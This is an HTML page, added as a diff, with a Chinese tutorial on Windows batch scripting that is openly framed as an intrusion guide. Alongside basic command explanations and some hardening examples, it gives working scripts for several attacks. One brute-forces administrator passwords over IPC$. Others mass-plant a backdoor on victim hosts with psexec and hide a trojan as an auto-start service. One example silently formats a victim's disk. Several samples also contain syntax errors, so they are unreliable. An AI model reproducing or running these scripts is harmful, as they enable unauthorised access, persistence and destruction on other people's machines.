@@ -1,0 +1,675 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>bat详解 -grule -hxzon动手</title></head><body><h1>bat详解 -grule -hxzon动手</h1><div><div>bat详解 -grule -hxzon动手</div>
+<div> </div>
+<div>bat文件批处理文件是无格式的文本文件，它包含一条或多条命令。它的文件扩展名为 .bat 或 .cmd。在命令提示下键入批处理文件的名称，或者双击该批处理文件，系统就会调用Cmd.exe按照该文件中各个命令出现的顺序来逐个运行它们。使用批处理文件（也被称为批处理程序或脚本），可以简化日常或重复性任务。当然我们的这个版本的主要内容是介绍批处理在入侵中一些实际运用，例如我们后面要提到的用批处理文件来给系统打补丁、批量植入后门程序等。下面就开始我们批处理学习之旅吧。<br>
+一.简单批处理内部命令简介<br>
+1.Echo 命令<br>
+打开回显或关闭请求回显功能，或显示消息。如果没有任何参数，echo 命令将显示当前回显设置。<br>
+语法<br>
+echo [{on|off}] [message]<br>
+Sample：@echo off / echo hello world<br>
+在实际应用中我们会把这条命令和重定向符号（也称为管道符号，一般用&gt; &gt;&gt; ^）结合来实现输入一些命令到特定格式的文件中.这将在以后的例子中体现出来。<br>
+2.@ 命令<br>
+表示不显示@后面的命令，在入侵过程中（例如使用批处理来格式化敌人的硬盘）自然不能让对方看到你使用的命令啦。<br>
+Sample：@echo off<br>
+@echo Now initializing the program,please wait a minite...<br>
+@format X: /q/u/autoset (format 这个命令是不可以使用/y这个参数的，可喜的是微软留了个autoset这个参数给我们，效果和/y是一样的。)<br>
+3.Goto 命令<br>
+指定跳转到标签，找到标签后，程序将处理从下一行开始的命令。<br>
+语法：goto label （label是参数，指定所要转向的批处理程序中的行。）<br>
+Sample：<br>
+if {%1}=={} goto noparms<br>
+if {%2}=={} goto noparms（如果这里的if、%1、%2你不明白的话，先跳过去，后面会有详细的解释。）<br>
+@Rem check parameters if null show usage<br>
+:noparms<br>
+echo Usage: monitor.bat ServerIP PortNumber<br>
+goto end<br>
+标签的名字可以随便起，但是最好是有意义的字母啦，字母前加个：用来表示这个字母是标签，goto命令就是根据这个：来寻找下一步跳到到那里。最好有一些说明这样你别人看起来才会理解你的意图啊。<br>
+4.Rem 命令<br>
+注释命令，在C语言中相当与/*--------*/,它并不会被执行，只是起一个注释的作用，便于别人阅读和你自己日后修改。<br>
+Rem Message<br>
+Sample：@Rem Here is the description.<br>
+5.Pause 命令<br>
+运行 Pause 命令时，将显示下面的消息：<br>
+Press any key to continue . . .<br>
+Sample：<br>
+@echo off<br>
+:begin<br>
+copy a:*.* d：\back<br>
+echo Please put a new disk into driver A<br>
+pause<br>
+goto begin<br>
+在这个例子中，驱动器 A 中磁盘上的所有文件均复制到d:\back中。显示的注释提示您将另一张磁盘放入驱动器 A 时，pause 命令会使程序挂起，以便您更换磁盘，然后按任意键继续处理。<br>
+6.Call 命令<br>
+从一个批处理程序调用另一个批处理程序，并且不终止父批处理程序。call 命令接受用作调用目标的标签。如果在脚本或批处理文件外使用 Call，它将不会在命令行起作用。<br>
+语法<br>
+call [[Drive:][Path] FileName [BatchParameters]] [:label [arguments]]<br>
+参数<br>
+[Drive:}[Path] FileName<br>
+指定要调用的批处理程序的位置和名称。filename 参数必须具有 .bat 或 .cmd 扩展名。<br>
+7.start 命令<br>
+调用外部程序，所有的DOS命令和命令行程序都可以由start命令来调用。<br>
+入侵常用参数：<br>
+MIN 开始时窗口最小化<br>
+SEPARATE 在分开的空间内开始 16 位 Windows 程序<br>
+HIGH 在 HIGH 优先级类别开始应用程序<br>
+REALTIME 在 REALTIME 优先级类别开始应用程序<br>
+WAIT 启动应用程序并等候它结束<br>
+parameters 这些为传送到命令/程序的参数<br>
+执行的应用程序是 32-位 GUI 应用程序时，CMD.EXE 不等应用程序终止就返回命令提示。如果在命令脚本内执行，该新行为则不会发生。<br>
+8.choice 命令<br>
+choice 使用此命令可以让用户输入一个字符，从而运行不同的命令。使用时应该加/c:参数，c:后应写提示可输入的字符，之间无空格。它的返回码为1234……<br>
+如: choice /c:dme defrag,mem,end<br>
+将显示<br>
+defrag,mem,end[D,M,E]?<br>
+Sample：<br>
+Sample.bat的内容如下:<br>
+@echo off<br>
+choice /c:dme defrag,mem,end<br>
+if errorlevel 3 goto defrag （应先判断数值最高的错误码）<br>
+if errorlevel 2 goto mem<br>
+if errotlevel 1 goto end<br>
+:defrag<br>
+c:\dos\defrag<br>
+goto end<br>
+:mem<br>
+mem<br>
+goto end<br>
+:end<br>
+echo good bye<br>
+此文件运行后，将显示 defrag,mem,end[D,M,E]? 用户可选择d m e ，然后if语句将作出判断，d表示执行标号为defrag的程序段，m表示执行标号为mem的程序段，e表示执行标号为end的程序段，每个程序段最后都以goto end将程序跳到end标号处，然后程序将显示good bye，文件结束。</div>
+<div> </div>
+<div>9.If 命令<br>
+if 表示将判断是否符合规定的条件，从而决定执行不同的命令。 有三种格式:<br>
+1、if &quot;参数&quot; == &quot;字符串&quot; 　待执行的命令<br>
+参数如果等于指定的字符串，则条件成立，运行命令，否则运行下一句。(注意是两个等号）<br>
+如if &quot;%1&quot;==&quot;a&quot; format a:<br>
+if {%1}=={} goto noparms<br>
+if {%2}=={} goto noparms<br>
+2、if exist 文件名　 待执行的命令<br>
+如果有指定的文件，则条件成立，运行命令，否则运行下一句。<br>
+如if exist config.sys edit config.sys<br>
+3、if errorlevel / if not errorlevel 数字　 待执行的命令<br>
+如果返回码等于指定的数字，则条件成立，运行命令，否则运行下一句。<br>
+如if errorlevel 2 goto x2 　<br>
+DOS程序运行时都会返回一个数字给DOS，称为错误码errorlevel或称返回码，常见的返回码为0、1。<br>
+10.for 命令<br>
+for 命令是一个比较复杂的命令，主要用于参数在指定的范围内循环执行命令。<br>
+在批处理文件中使用 FOR 命令时，指定变量请使用 %%variable<br>
+for {%variable|%%variable} in (set) do command [ CommandLineOptions]<br>
+%variable 指定一个单一字母可替换的参数。<br>
+(set) 指定一个或一组文件。可以使用通配符。<br>
+command 指定对每个文件执行的命令。<br>
+command-parameters 为特定命令指定参数或命令行开关。<br>
+在批处理文件中使用 FOR 命令时，指定变量请使用 %%variable<br>
+而不要用 %variable。变量名称是区分大小写的，所以 %i 不同于 %I<br>
+如果命令扩展名被启用，下列额外的 FOR 命令格式会受到<br>
+支持:<br>
+FOR /D %variable IN (set) DO command [command-parameters]<br>
+如果集中包含通配符，则指定与目录名匹配，而不与文件<br>
+名匹配。<br>
+FOR /R [[drive:]path] %variable IN (set) DO command [command-<br>
+检查以 [drive:]path 为根的目录树，指向每个目录中的<br>
+FOR 语句。如果在 /R 后没有指定目录，则使用当前<br>
+目录。如果集仅为一个单点(.)字符，则枚举该目录树。<br>
+FOR /L %variable IN (start,step,end) DO command [command-para<br>
+该集表示以增量形式从开始到结束的一个数字序列。<br>
+因此，(1,1,5) 将产生序列 1 2 3 4 5，(5,-1,1) 将产生<br>
+序列 (5 4 3 2 1)。<br>
+FOR /F [&quot;options&quot;] %variable IN (file-set) DO command<br>
+FOR /F [&quot;options&quot;] %variable IN (&quot;string&quot;) DO command<br>
+FOR /F [&quot;options&quot;] %variable IN (command) DO command<br>
+或者，如果有 usebackq 选项:<br>
+FOR /F [&quot;options&quot;] %variable IN (file-set) DO command<br>
+FOR /F [&quot;options&quot;] %variable IN (&quot;string&quot;) DO command<br>
+FOR /F [&quot;options&quot;] %variable IN (command) DO command<br>
+filenameset 为一个或多个文件名。继续到 filenameset 中的<br>
+下一个文件之前，每份文件都已被打开、读取并经过处理。<br>
+处理包括读取文件，将其分成一行行的文字，然后将每行<br>
+解析成零或更多的符号。然后用已找到的符号字符串变量值<br>
+调用 For 循环。以默认方式，/F 通过每个文件的每一行中分开<br>
+的第一个空白符号。跳过空白行。您可通过指定可选 &quot;options&quot;<br>
+参数替代默认解析操作。这个带引号的字符串包括一个或多个<br>
+指定不同解析选项的关键字。这些关键字为:<br>
+eol=c - 指一个行注释字符的结尾(就一个)<br>
+skip=n - 指在文件开始时忽略的行数。<br>
+delims=xxx - 指分隔符集。这个替换了空格和跳格键的<br>
+默认分隔符集。<br>
+tokens=x,y,m-n - 指每行的哪一个符号被传递到每个迭代<br>
+的 for 本身。这会导致额外变量名称的<br>
+格式为一个范围。通过 nth 符号指定 m<br>
+符号字符串中的最后一个字符星号，<br>
+那么额外的变量将在最后一个符号解析之<br>
+分配并接受行的保留文本。<br>
+usebackq - 指定新语法已在下类情况中使用:<br>
+在作为命令执行一个后引号的字符串并且<br>
+引号字符为文字字符串命令并允许在 fi<br>
+中使用双引号扩起文件名称。<br>
+sample1:<br>
+FOR /F &quot;eol=; tokens=2,3* delims=, &quot; %i in (myfile.txt) do command<br>
+会分析 myfile.txt 中的每一行，忽略以分号打头的那些行，将<br>
+每行中的第二个和第三个符号传递给 for 程序体；用逗号和/或<br>
+空格定界符号。请注意，这个 for 程序体的语句引用 %i 来<br>
+取得第二个符号，引用 %j 来取得第三个符号，引用 %k<br>
+来取得第三个符号后的所有剩余符号。对于带有空格的文件<br>
+名，您需要用双引号将文件名括起来。为了用这种方式来使<br>
+用双引号，您还需要使用 usebackq 选项，否则，双引号会<br>
+被理解成是用作定义某个要分析的字符串的。<br>
+%i 专门在 for 语句中得到说明，%j 和 %k 是通过<br>
+tokens= 选项专门得到说明的。您可以通过 tokens= 一行<br>
+指定最多 26 个符号，只要不试图说明一个高于字母 z 或<br>
+Z 的变量。请记住，FOR 变量是单一字母、分大小写和全局的；<br>
+同时不能有 52 个以上都在使用中。<br>
+您还可以在相邻字符串上使用 FOR /F 分析逻辑；方法是，<br>
+用单引号将括号之间的 filenameset 括起来。这样，该字符<br>
+串会被当作一个文件中的一个单一输入行。<br>
+最后，您可以用 FOR /F 命令来分析命令的输出。方法是，将<br>
+括号之间的 filenameset 变成一个反括字符串。该字符串会<br>
+被当作命令行，传递到一个子 CMD.EXE，其输出会被抓进<br>
+内存，并被当作文件分析。因此，以下例子:<br>
+FOR /F &quot;usebackq delims==&quot; %i IN (`set`) DO @echo %i<br>
+会枚举当前环境中的环境变量名称。<br>
+另外，FOR 变量参照的替换已被增强。您现在可以使用下列<br>
+选项语法:<br>
+~I - 删除任何引号(&quot;)，扩充 %I<br>
+%~fI - 将 %I 扩充到一个完全合格的路径名<br>
+%~dI - 仅将 %I 扩充到一个驱动器号<br>
+%~pI - 仅将 %I 扩充到一个路径<br>
+%~nI - 仅将 %I 扩充到一个文件名<br>
+%~xI - 仅将 %I 扩充到一个文件扩展名<br>
+%~sI - 扩充的路径只含有短名<br>
+%~aI - 将 %I 扩充到文件的文件属性<br>
+%~tI - 将 %I 扩充到文件的日期/时间<br>
+%~zI - 将 %I 扩充到文件的大小<br>
+%~$PATH:I - 查找列在路径环境变量的目录，并将 %I 扩充<br>
+到找到的第一个完全合格的名称。如果环境变量<br>
+未被定义，或者没有找到文件，此组合键会扩充<br>
+空字符串<br>
+可以组合修饰符来得到多重结果:<br>
+%~dpI - 仅将 %I 扩充到一个驱动器号和路径<br>
+%~nxI - 仅将 %I 扩充到一个文件名和扩展名<br>
+%~fsI - 仅将 %I 扩充到一个带有短名的完整路径名<br>
+%~dp$PATH:i - 查找列在路径环境变量的目录，并将 %I 扩充<br>
+到找到的第一个驱动器号和路径。<br>
+%~ftzaI - 将 %I 扩充到类似输出线路的 DIR<br>
+在以上例子中，%I 和 PATH 可用其他有效数值代替。%~ 语法<br>
+用一个有效的 FOR 变量名终止。选取类似 %I 的大写变量名<br>
+比较易读，而且避免与不分大小写的组合键混淆。<br>
+以上是MS的官方帮助，下面我们举几个例子来具体说明一下For命令在入侵中的用途。<br>
+sample2：<br>
+利用For命令来实现对一台目标Win2k主机的暴力密码破解。<br>
+我们用net use \\ip\ipc$ &quot;password&quot; /u:&quot;administrator&quot;来尝试这和目标主机进行连接，当成功时记下密码。<br>
+最主要的命令是一条：for /f i% in (dict.txt) do net use \\ip\ipc$ &quot;i%&quot; /u:&quot;administrator&quot;<br>
+用i%来表示admin的密码，在dict.txt中这个取i%的值用net use 命令来连接。然后将程序运行结果传递给find命令－－<br>
+for /f i%% in (dict.txt) do net use \\ip\ipc$ &quot;i%%&quot; /u:&quot;administrator&quot;|find &quot;:命令成功完成&quot;&gt;&gt;D:\ok.txt ，这样就ko了。<br>
+sample3：<br>
+你有没有过手里有大量肉鸡等着你去种后门＋木马呢？，当数量特别多的时候，原本很开心的一件事都会变得很郁闷：）。文章开头就谈到使用批处理文件，可以简化日常或重复性任务。那么如何实现呢？呵呵，看下去你就会明白了。<br>
+主要命令也只有一条：（在批处理文件中使用 FOR 命令时，指定变量使用 %%variable）<br>
+@for /f &quot;tokens=1,2,3 delims= &quot; %%i in (victim.txt) do start call door.bat %%i %%j %%k<br>
+tokens的用法请参见上面的sample1，在这里它表示按顺序将victim.txt中的内容传递给door.bat中的参数%i %j %k。<br>
+而cultivate.bat无非就是用net use命令来建立IPC$连接，并copy木马＋后门到victim，然后用返回码（If errorlever =）来筛选成功种植后门的主机，并echo出来，或者echo到指定的文件。<br>
+delims= 表示vivtim.txt中的内容是一空格来分隔的。我想看到这里你也一定明白这victim.txt里的内容是什么样的了。应该根据%%i %%j %%k表示的对象来排列，一般就是 ip password username。<br>
+代码雏形：<br>
+--------------- cut here then save as a batchfile(I call it main.bat ) ---------------------------<br>
+@echo off<br>
+@if &quot;%1&quot;==&quot;&quot; goto usage<br>
+@for /f &quot;tokens=1,2,3 delims= &quot; %%i in (victim.txt) do start call IPChack.bat %%i %%j %%k<br>
+@goto end<br>
+:usage<br>
+@echo run this batch in dos modle.or just double-click it.<br>
+:end<br>
+--------------- cut here then save as a batchfile(I call it main.bat ) ---------------------------</div>
+<div> </div>
+<div>------------------- cut here then save as a batchfile(I call it door.bat) -----------------------------<br>
+@net use \\%1\ipc$ %3 /u:&quot;%2&quot;<br>
+@if errorlevel 1 goto failed<br>
+@echo Trying to establish the IPC$ connection …………OK<br>
+@copy windrv32.exe\\%1\admin$\system32 &amp;&amp; if not errorlevel 1 echo IP %1 USER %2 PWD %3 &gt;&gt;ko.txt<br>
+@psexec \\%1 c:\winnt\system32\windrv32.exe<br>
+@psexec \\%1 net start windrv32 &amp;&amp; if not errorlevel 1 echo %1 Backdoored &gt;&gt;ko.txt<br>
+:failed<br>
+@echo Sorry can not connected to the victim.<br>
+----------------- cut here then save as a batchfile(I call it door.bat) --------------------------------<br>
+这只是一个自动种植后门批处理的雏形，两个批处理和后门程序（Windrv32.exe）,PSexec.exe需放在统一目录下.批处理内容<br>
+尚可扩展,例如:加入清除日志+DDOS的功能,加入定时添加用户的功能,更深入一点可以使之具备自动传播功能(蠕虫).此处不多做叙述,有兴趣的朋友可自行研究.</div>
+<div> </div>
+<div>No.2<br>
+二.如何在批处理文件中使用参数<br>
+批处理中可以使用参数，一般从1%到 9%这九个，当有多个参数时需要用shift来移动，这种情况并不多见，我们就不考虑它了。<br>
+sample1：fomat.bat<br>
+@echo off<br>
+if &quot;%1&quot;==&quot;a&quot; format a:<br>
+:format<br>
+@format a:/q/u/auotset<br>
+@echo please insert another disk to driver A.<br>
+@pause<br>
+@goto fomat<br>
+这个例子用于连续地格式化几张软盘，所以用的时候需在dos窗口输入fomat.bat a，呵呵,好像有点画蛇添足了～^_^<br>
+sample2：<br>
+当我们要建立一个IPC$连接地时候总要输入一大串命令，弄不好就打错了，所以我们不如把一些固定命令写入一个批处理，把肉鸡地ip password username 当着参数来赋给这个批处理，这样就不用每次都打命令了。<br>
+@echo off<br>
+@net use \\1%\ipc$ &quot;2%&quot; /u:&quot;3%&quot; 注意哦，这里PASSWORD是第二个参数。<br>
+@if errorlevel 1 echo connection failed<br>
+怎么样,使用参数还是比较简单的吧？你这么帅一定学会了^_^.No.3<br>
+三.如何使用组合命令(Compound Command)</div>
+<div> </div>
+<div>1.&amp;<br>
+Usage：第一条命令 &amp; 第二条命令 [&amp; 第三条命令...]<br>
+用这种方法可以同时执行多条命令，而不管命令是否执行成功<br>
+Sample：<br>
+C:\&gt;dir z: &amp; dir c:\Ex4rch<br>
+The system cannot find the path specified.<br>
+Volume in drive C has no label.<br>
+Volume Serial Number is 0078-59FB<br>
+Directory of c:\Ex4rch<br>
+2002-05-14 23:51 &lt;DIR&gt; .<br>
+2002-05-14 23:51 &lt;DIR&gt; ..<br>
+2002-05-14 23:51 14 sometips.gif<br>
+2.&amp;&amp;<br>
+Usage：第一条命令 &amp;&amp; 第二条命令 [&amp;&amp; 第三条命令...]<br>
+用这种方法可以同时执行多条命令，当碰到执行出错的命令后将不执行后面的命令，如果一直没有出错则一直执行完所有命令；<br>
+Sample：<br>
+C:\&gt;dir z: &amp;&amp; dir c:\Ex4rch<br>
+The system cannot find the path specified.<br>
+C:\&gt;dir c:\Ex4rch &amp;&amp; dir z:<br>
+Volume in drive C has no label.<br>
+Volume Serial Number is 0078-59FB<br>
+Directory of c:\Ex4rch<br>
+2002-05-14 23:55 &lt;DIR&gt; .<br>
+2002-05-14 23:55 &lt;DIR&gt; ..<br>
+2002-05-14 23:55 14 sometips.gif<br>
+1 File(s) 14 bytes<br>
+2 Dir(s) 768,671,744 bytes free<br>
+The system cannot find the path specified.<br>
+在做备份的时候可能会用到这种命令会比较简单，如：<br>
+dir file://192.168.0.1/database/backup.mdb &amp;&amp; copy file://192.168.0.1/database/backup.mdb E:\backup<br>
+如果远程服务器上存在backup.mdb文件，就执行copy命令，若不存在该文件则不执行copy命令。这种用法可以替换IF exist了 ：）<br>
+3.||<br>
+Usage：第一条命令 || 第二条命令 [|| 第三条命令...]<br>
+用这种方法可以同时执行多条命令，当碰到执行正确的命令后将不执行后面的命令，如果没有出现正确的命令则一直执行完所有命令；<br>
+Sample：<br>
+C:\Ex4rch&gt;dir sometips.gif || del sometips.gif<br>
+Volume in drive C has no label.<br>
+Volume Serial Number is 0078-59FB<br>
+Directory of C:\Ex4rch<br>
+2002-05-14 23:55 14 sometips.gif<br>
+1 File(s) 14 bytes<br>
+0 Dir(s) 768,696,320 bytes free<br>
+组合命令使用的例子：<br>
+sample：<br>
+@copy trojan.exe \\%1\admin$\system32 &amp;&amp; if not errorlevel 1 echo IP %1 USER %2 PASS %3 &gt;&gt;victim.txt <br>
+四、管道命令的使用</div>
+<div> </div>
+<div>1.| 命令<br>
+Usage：第一条命令 | 第二条命令 [| 第三条命令...]<br>
+将第一条命令的结果作为第二条命令的参数来使用，记得在unix中这种方式很常见。<br>
+sample：<br>
+time /t&gt;&gt;D:\IP.log<br>
+netstat -n -p tcp|find &quot;:3389&quot;&gt;&gt;D:\IP.log<br>
+start Explorer<br>
+看出来了么？用于终端服务允许我们为用户自定义起始的程序，来实现让用户运行下面这个bat，以获得登录用户的IP。<br>
+2.&gt;、&gt;&gt;输出重定向命令<br>
+将一条命令或某个程序输出结果的重定向到特定文件中, &gt; 与 &gt;&gt;的区别在于，&gt;会清除调原有文件中的内容后写入指定文件，而&gt;&gt;只会追加内容到指定文件中，而不会改动其中的内容。<br>
+sample1：<br>
+echo hello world&gt;c:\hello.txt (stupid example?)<br>
+sample2:<br>
+时下DLL木马盛行，我们知道system32是个捉迷藏的好地方，许多木马都削尖了脑袋往那里钻，DLL马也不例外，针对这一点我们可以在安装好系统和必要的应用程序后，对该目录下的EXE和DLL文件作一个记录：<br>
+运行CMD--转换目录到system32--dir *.exe&gt;exeback.txt &amp; dir *.dll&gt;dllback.txt,<br>
+这样所有的EXE和DLL文件的名称都被分别记录到exeback.txt和dllback.txt中,<br>
+日后如发现异常但用传统的方法查不出问题时,则要考虑是不是系统中已经潜入DLL木马了.<br>
+这时我们用同样的命令将system32下的EXE和DLL文件记录到另外的exeback1.txt和dllback1.txt中,然后运行:<br>
+CMD--fc exeback.txt exeback1.txt&gt;diff.txt &amp; fc dllback.txt dllback1.txt&gt;diff.txt.(用FC命令比较前后两次的DLL和EXE文件,并将结果输入到diff.txt中),这样我们就能发现一些多出来的DLL和EXE文件,然后通过查看创建时间、版本、是否经过压缩等就能够比较容易地判断出是不是已经被DLL木马光顾了。没有是最好，如果有的话也不要直接DEL掉，先用regsvr32 /u trojan.dll将后门DLL文件注销掉,再把它移到回收站里，若系统没有异常反映再将之彻底删除或者提交给杀毒软件公司。<br>
+3.&lt; 、&gt;&amp; 、&lt;&amp;<br>
+&lt; 从文件中而不是从键盘中读入命令输入。<br>
+&gt;&amp; 将一个句柄的输出写入到另一个句柄的输入中。<br>
+&lt;&amp; 从一个句柄读取输入并将其写入到另一个句柄输出中。<br>
+这些并不常用，也就不多做介绍。<br>
+No.5<br>
+五.如何用批处理文件来操作注册表<br>
+在入侵过程中经常回操作注册表的特定的键值来实现一定的目的，例如:为了达到隐藏后门、木马程序而删除Run下残余的键值。或者创建一个服务用以加载后门。当然我们也会修改注册表来加固系统或者改变系统的某个属性，这些都需要我们对注册表操作有一定的了解。下面我们就先学习一下如何使用.REG文件来操作注册表.(我们可以用批处理来生成一个REG文件)<br>
+关于注册表的操作，常见的是创建、修改、删除。<br>
+1.创建<br>
+创建分为两种，一种是创建子项(Subkey)<br>
+我们创建一个文件，内容如下：<br>
+Windows Registry Editor Version 5.00<br>
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\hacker]<br>
+然后执行该脚本，你就已经在HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft下创建了一个名字为&ldquo;hacker&rdquo;的子项。<br>
+另一种是创建一个项目名称<br>
+那这种文件格式就是典型的文件格式，和你从注册表中导出的文件格式一致，内容如下：<br>
+Windows Registry Editor Version 5.00<br>
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]<br>
+&quot;Invader&quot;=&quot;Ex4rch&quot;<br>
+&quot;Door&quot;=C:\\WINNT\\system32\\door.exe<br>
+&quot;Autodos&quot;=dword:02<br>
+这样就在[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]下<br>
+新建了:Invader、door、about这三个项目<br>
+Invader的类型是&ldquo;String value&rdquo;<br>
+door的类型是&ldquo;REG SZ value&rdquo;<br>
+Autodos的类型是&ldquo;DWORD value&rdquo;</div>
+<div> </div>
+<div>2.修改<br>
+修改相对来说比较简单，只要把你需要修改的项目导出，然后用记事本进行修改，然后导入（regedit /s）即可。<br>
+3.删除<br>
+我们首先来说说删除一个项目名称，我们创建一个如下的文件：<br>
+Windows Registry Editor Version 5.00<br>
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]<br>
+&quot;Ex4rch&quot;=-<br>
+执行该脚本，[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]下的&quot;Ex4rch&quot;就被删除了；<br>
+我们再看看删除一个子项，我们创建一个如下的脚本：<br>
+Windows Registry Editor Version 5.00<br>
+[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]<br>
+执行该脚本，[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]就已经被删除了。<br>
+相信看到这里，.reg文件你基本已经掌握了。那么现在的目标就是用批处理来创建特定内容的.reg文件了，记得我们前面说道的利用重定向符号可以很容易地创建特定类型的文件。<br>
+samlpe1:如上面的那个例子,如想生成如下注册表文件<br>
+Windows Registry Editor Version 5.00<br>
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]<br>
+&quot;Invader&quot;=&quot;Ex4rch&quot;<br>
+&quot;door&quot;=hex:255<br>
+&quot;Autodos&quot;=dword:000000128<br>
+只需要这样：<br>
+@echo Windows Registry Editor Version 5.00&gt;&gt;Sample.reg<br>
+@echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]&gt;Sample.reg<br>
+@echo &quot;Invader&quot;=&quot;Ex4rch&quot;&gt;&gt;Sample.reg<br>
+@echo &quot;door&quot;=5&gt;&gt;C:\\WINNT\\system32\\door.exe&gt;&gt;Sample. reg<br>
+@echo &quot;Autodos&quot;=dword:02&gt;&gt;Sample.reg</div>
+<div> </div>
+<div>samlpe2:<br>
+我们现在在使用一些比较老的木马时,可能会在注册表的[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\ CurrentVersion\Run(Runonce、Runservices、Runexec)]下生成一个键值用来实现木马的自启动.但是这样很容易暴露木马程序的路径,从而导致木马被查杀,相对地若是将木马程序注册为系统服务则相对安全一些.下面以配置好地IRC木马DSNX为例(名为 windrv32.exe)<br>
+@start windrv32.exe<br>
+@attrib +h +r windrv32.exe<br>
+@echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] &gt;&gt;patch.dll<br>
+@echo &quot;windsnx &quot;=- &gt;&gt;patch.dll<br>
+@sc.exe create Windriversrv type= kernel start= auto displayname= WindowsDriver binpath= c:\winnt\system32\windrv32.exe<br>
+@regedit /s patch.dll<br>
+@delete patch.dll<br>
+@REM [删除DSNXDE在注册表中的启动项，用sc.exe将之注册为系统关键性服务的同时将其属性设为隐藏和只读，并config为自启动]<br>
+@REM 这样不是更安全^_^. <br>
+六.精彩实例放送。<br>
+1.删除win2k/xp系统默认共享的批处理<br>
+------------------------ cut here then save as .bat or .cmd file ---------------------------</div>
+<div> </div>
+<div>@echo preparing to delete all the default shares.when ready pres any key.<br>
+@pause<br>
+@echo off<br>
+:Rem check parameters if null show usage.<br>
+if {%1}=={} goto :Usage<br>
+:Rem code start.<br>
+echo.<br>
+echo ------------------------------------------------------<br>
+echo.<br>
+echo Now deleting all the default shares.<br>
+echo.<br>
+net share %1$ /delete<br>
+net share %2$ /delete<br>
+net share %3$ /delete<br>
+net share %4$ /delete<br>
+net share %5$ /delete<br>
+net share %6$ /delete<br>
+net share %7$ /delete<br>
+net share %8$ /delete<br>
+net share %9$ /delete<br>
+net stop Server<br>
+net start Server<br>
+echo.<br>
+echo All the shares have been deleteed<br>
+echo.<br>
+echo ------------------------------------------------------<br>
+echo.<br>
+echo Now modify the registry to change the system default properties.<br>
+echo.<br>
+echo Now creating the registry file<br>
+echo Windows Registry Editor Version 5.00&gt; c:\delshare.reg<br>
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters]&gt;&gt; c:\delshare.reg<br>
+echo &quot;AutoShareWks&quot;=dword:00000000&gt;&gt; c:\delshare.reg<br>
+echo &quot;AutoShareServer&quot;=dword:00000000&gt;&gt; c:\delshare.reg<br>
+echo Nowing using the registry file to chang the system default properties.<br>
+regedit /s c:\delshare.reg<br>
+echo Deleting the temprotarily files.<br>
+del c:\delshare.reg<br>
+goto :END<br>
+:Usage<br>
+echo.<br>
+echo ------------------------------------------------------<br>
+echo.<br>
+echo ☆ A example for batch file ☆<br>
+echo ☆ [Use batch file to change the sysytem share properties.] ☆<br>
+echo.<br>
+echo Author：Ex4rch<br>
+echo Mail:Ex4rch@hotmail.comQQ:1672602<br>
+echo.<br>
+echo Error：Not enough parameters<br>
+echo.<br>
+echo ☆ Please enter the share disk you wanna delete ☆<br>
+echo.<br>
+echo For instance，to delete the default shares:<br>
+echo delshare c d e ipc admin print<br>
+echo.<br>
+echo If the disklable is not as C: D: E: ，Please chang it youself.<br>
+echo.<br>
+echo example：<br>
+echo If locak disklable are C: D: E: X: Y: Z: ，you should chang the command into ：<br>
+echo delshare c d e x y z ipc admin print<br>
+echo.<br>
+echo *** you can delete nine shares once in a useing ***<br>
+echo.<br>
+echo ------------------------------------------------------<br>
+goto :EOF<br>
+:END<br>
+echo.<br>
+echo ------------------------------------------------------<br>
+echo.<br>
+echo OK,delshare.bat has deleted all the share you assigned.<br>
+echo.Any questions ,feel free to mail to Ex4rch@hotmail.com.echo<br>
+echo.<br>
+echo ------------------------------------------------------<br>
+echo.<br>
+:EOF<br>
+echo end of the batch file<br>
+------------------------ cut here then save as .bat or .cmd file ---------------------------</div>
+<div> </div>
+<div>2.全面加固系统（给肉鸡打补丁）的批处理文件<br>
+------------------------ cut here then save as .bat or .cmd file ---------------------------<br>
+@echo Windows Registry Editor Version 5.00 &gt;patch.dll<br>
+@echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\lanmanserver\parameters] &gt;&gt;patch.dll<br>
+@echo &quot;AutoShareServer&quot;=dword:00000000 &gt;&gt;patch.dll<br>
+@echo &quot;AutoShareWks&quot;=dword:00000000 &gt;&gt;patch.dll<br>
+@REM [禁止共享]<br>
+@echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa] &gt;&gt;patch.dll<br>
+@echo &quot;restrictanonymous&quot;=dword:00000001 &gt;&gt;patch.dll<br>
+@REM [禁止匿名登录]<br>
+@echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBT\Parameters] &gt;&gt;patch.dll<br>
+@echo &quot;SMBDeviceEnabled&quot;=dword:00000000 &gt;&gt;patch.dll<br>
+@REM [禁止及文件访问和打印共享]<br>
+@echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\@REMoteRegistry] &gt;&gt;patch.dll<br>
+@echo &quot;Start&quot;=dword:00000004 &gt;&gt;patch.dll<br>
+@echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Schedule] &gt;&gt;patch.dll<br>
+@echo &quot;Start&quot;=dword:00000004 &gt;&gt;patch.dll<br>
+@echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon] &gt;&gt;patch.dll<br>
+@echo &quot;ShutdownWithoutLogon&quot;=&quot;0&quot; &gt;&gt;patch.dll<br>
+@REM [禁止登录前关机]<br>
+@echo &quot;DontDisplayLastUserName&quot;=&quot;1&quot; &gt;&gt;patch.dll<br>
